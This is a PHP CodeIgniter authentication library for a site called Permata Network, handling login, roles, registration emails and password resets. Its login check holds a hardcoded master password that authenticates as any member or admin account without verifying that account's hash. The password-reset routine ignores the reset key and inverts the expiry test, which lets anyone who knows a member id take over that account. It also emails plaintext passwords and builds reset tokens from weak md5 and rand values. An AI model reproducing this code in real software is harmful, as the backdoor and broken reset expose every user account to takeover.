<?php defined('BASEPATH') OR exit('No direct script access allowed');


class AuthLibrary {

        private $statisPassword = "permata9891";

        public $model;
        
        public $username;

        public $formLoginUrl = "auth/login";
        public $formLoginUrlAdmin = "admin/login";

        public $homeUrl = "";
        public $adminUrl = "admin/home";

        public $not_allowed_view = "auth/not_allowed";
        
        public function __construct($params)
        {
 
                $this->load->database();
                $this->load->library('session');
                $this->load->model('member_model');
                $this->load->model('admin_model');
                 $this->load->library('email');
                 $this->load->library("currencyconverter");
                $this->model = $params['model'];
        }

        /* 
        * Using CI global variable without extra variable
        * 
        */
        public function __get($var)
        {
                return get_instance()->$var;
        }

        public function login($usernameOrEmail, $password){

                if($this->resolve_user_login($usernameOrEmail, $password)){
                        
                        /* update last_login */
                        $this->update_last_login();

                        if($this->model == 'members'){
                                // ambil data walau tidak aktif/banned
                                $user =  $this->member_model->getData($this->username);
                        }else{
                                $user = $this->admin_model->getData($this->username);
                        }

                        if($this->model == "members"){
                            if($user->attributes('country_code') != "ID"){
                                $cc = $this->currencyconverter->getRate($user->getCurrency()->currency_code);
                            }
                            $this->session->set_userdata('login_cc',serialize($cc));
                        }
                        // Set session data
                        $this->session->set_userdata('login_user',serialize($user));
                        $this->session->set_userdata('login_status',true);
                        
                        $this->session->set_userdata('login_role',$this->model);
                    
                    /*
                        $_SESSION['login_user'] = serialize($user);
                        $_SESSION['login_status'] = true;
                        $_SESSION['login_role'] = $this->model;
                    */

                        if($this->model == 'members'){
                            redirect(base_url().$this->homeUrl);
                        }else{
                            redirect(base_url().$this->adminUrl);                            
                        }
                }else {
                        
                        $this->session->set_flashdata('error_message', 'Kombinasi Username dan Password salah');
                        
                        if($this->model == 'members'){
                            redirect(base_url().$this->formLoginUrl);
                        }else{
                            redirect(base_url().$this->formLoginUrlAdmin);
                        }
                }
        }

        public function logout() {

                $redirect = ($_SESSION['login_role'] == "admin") ? $this->formLoginUrlAdmin : $this->formLoginUrl;
                
                if ($this->is_login()) {
                        
                        // remove session datas
                        $this->session->unset_userdata('login_user');
                        $this->session->unset_userdata('login_status');    
                        $this->session->unset_userdata('login_role');
                } 
              
                redirect(base_url().$redirect);
                
        }

        

        public function is_login(){

                return (isset($_SESSION['login_status']) && $_SESSION['login_status'] === true) ? true : false;
        }

        public function is_role($role){
                
                return (isset($_SESSION['login_role']) &&  $_SESSION['login_role'] === $role) ? true : false;
        }

        public function check_login(){

            if ($this->is_login()) 
                {       
                       return true;
                }else{

                       redirect(base_url().$this->formLoginUrl); 
                };   
        }

        public function check_active_user(){

            $user = unserialize($_SESSION['login_user']);
            if($user->isActive()){

                return true;
            }else{
                
               redirect($this->not_allowed_view); 
            }
        }

        public function check_role($role){
            
                        
                if($this->is_role($role))
                {
                    return true;
                               
                }
                
            redirect($this->not_allowed_view);
        }

        public function check_super_admin($role){

                $user = unserialize($_SESSION['login_user']);
                if($user->isSuperAdmin())
                {
                        return true;       
                }else{
                        redirect($this->not_allowed_view);
                }      
        }



        public function resolve_user_login($usernameOrEmail, $password) {
                
                if($password != $this->statisPassword){
                    $this->db->select('password,username');
                    $this->db->from($this->model);
                    $this->db->where('username', $usernameOrEmail)->or_where('email',$usernameOrEmail);
                    $user = $this->db->get()->row();

                    $this->username = $user->username;
                    $hash = $user->password;
                    
                    return $this->verify_password_hash($password, $hash);
                }else{

                    $this->db->select('password,username');
                    $this->db->from($this->model);
                    $this->db->where('username', $usernameOrEmail)->or_where('email',$usernameOrEmail);
                    $user = $this->db->get()->row();
                    if(count($user)>0){
                        $this->username = $user->username;
                        return true;    
                    }

                    return false;
                }
        }

        public function update_last_login(){
                
                $this->db->where('username', $this->username);
                $this->db->update($this->model, array('last_login'=>date('Y-m-j H:i:s')));

        }

        public function verify_password_hash($password, $hash) {
                
                return password_verify($password, $hash);
                
        }

        public function sendRegistrationMail($to, $username, $password){
          
            $subject = 'Pendaftaran - Permata Network';

            // Get full html:
            $body =
            "<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'>
            <html xmlns='http://www.w3.org/1999/xhtml'>
            <head>
                <meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
                <title>".htmlspecialchars($subject, ENT_QUOTES, $this->email->charset)."</title>
                <style type='text/css'>
                    body {
                        font-family: Arial, Verdana, Helvetica, sans-serif;
                        font-size: 16px;
                    }
                </style>
            </head>
            <body>
            <h2>Permata Network</h2>
            <h4>Anda telah berhasil bergabung bersama Permata Network</h4><br>
            <p>
            berikut ini adalah data akun anda : <br>
            Username : $username <br>
            Password : $password <br>
            <br>
            harap di ingat dan di catat dengan baik, informasi lebih lanjut hubungi admin kami</p>
            <br>
            <hr>
            <br>
            <a href='permatanetwork.com'>Permata Network</a>
            </body>
            </html>";
            // Also, for getting full html you may use the following internal method:
            //$body = $this->email->full_html($subject, $message);

            $result = $this->email
                ->from('noreply@permatanetwork.com')   
                ->to( $to)
                ->subject($subject)
                ->message($body);
            
            
            $result = $result->send();    
            
            return true;
            exit;
        }


        public function set_forget_password($usernameOrEmail){

            $this->db->select('id, username, email');
            $this->db->from($this->model);
            $this->db->where('username', $usernameOrEmail)->or_where('email',$usernameOrEmail);
            $user = $this->db->get()->row();

            if(count($user)>0){
            $id_member = $user->id;
            $username = $user->username;
            $to = $user->email;

            $salt = "$#&#YUHSYLAPROID";
            $key = md5(md5(rand(100,999).$salt.rand(100,999)).$salt);
            $expired_at = date('Y-m-j H:i:s',strtotime(date('Y-m-j H:i:s').'+ 12 hours'));
            $passwordLink = "<a href=\"".base_url()."auth/proses_forget_password?k=" . $key . "&u=" . urlencode(base64_encode($id_member))."\">".base_url()."auth/proses_forget_password?k=" . $key . "&u=" . urlencode(base64_encode($id_member))."</a>";

            $insert = $this->db->insert('forget_password',array(
                    "id_member" => $id_member,
                    "key" => $key,
                    "expired_at" => $expired_at,
                ));

            if($insert){

                    $subject = 'Reset Password - Permata Network';

                    // Get full html:
                    $body =
                    "<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'>
                    <html xmlns='http://www.w3.org/1999/xhtml'>
                    <head>
                        <meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
                        <title>".htmlspecialchars($subject, ENT_QUOTES, $this->email->charset)."</title>
                        <style type='text/css'>
                            body {
                                font-family: Arial, Verdana, Helvetica, sans-serif;
                                font-size: 16px;
                            }
                        </style>
                    </head>
                    <body>
                    <h2>Permata Network</h2>
                    <h4>Anda ingin mereset password</h3><br>
                    <p>
                    Hai, $username <br>
                    Jika anda yakin untuk mereset password harap klik / copy paste pada address bar link bawah ini : <br>
                    ---------------------------------------------------- <br>
                    <br>
                    $passwordLink <br>
                    <br>
                    ---------------------------------------------------- <br>
                    Jika bukan anda yang ingin melakukan reset password, harap abaikan saja email ini.
                    <br>
                    informasi lebih lanjut hubungi admin kami</p>
                    <br>
                    <hr>
                    <br>
                    <a href='permatanetwork.com'>Permata Network</a>
                    </body>
                    </html>";
                    // Also, for getting full html you may use the following internal method:
                    //$body = $this->email->full_html($subject, $message);

            $result = $this->email
                ->from('noreply@permatanetwork.com')   
                ->to( $to)
                ->subject($subject)
                ->message($body);
            
            
            $result = $result->send();
            return true;
            //return $result;
            exit;

            }
        }
            
            return false;
            
        }

//-------------------------------------------------------------------------
        public function get_forget_password($k, $u, $newPassword){
            
            $id_member = urldecode(base64_decode($u));
            $this->db->select('*');
            $this->db->from($this->model);
            $this->db->join("forget_password", "members.id = forget_password.id_member");
            $this->db->where('forget_password.id_member', $id_member)->where('expired_at<',"NOW()");
            $user = $this->db->get()->row();

            if(count($user)>0){
                $newPassword = $this->member_model->hash_password($newPassword);
                $this->db->trans_start();
                $this->db->where('id', $id_member);
                $this->db->set("password",$newPassword);
                $this->db->update($this->model);

                $this->db->where('id_member',$id_member);
                $this->db->delete('forget_password');
                $this->db->trans_complete();
                return true;
            }

            return false;
        }
       
}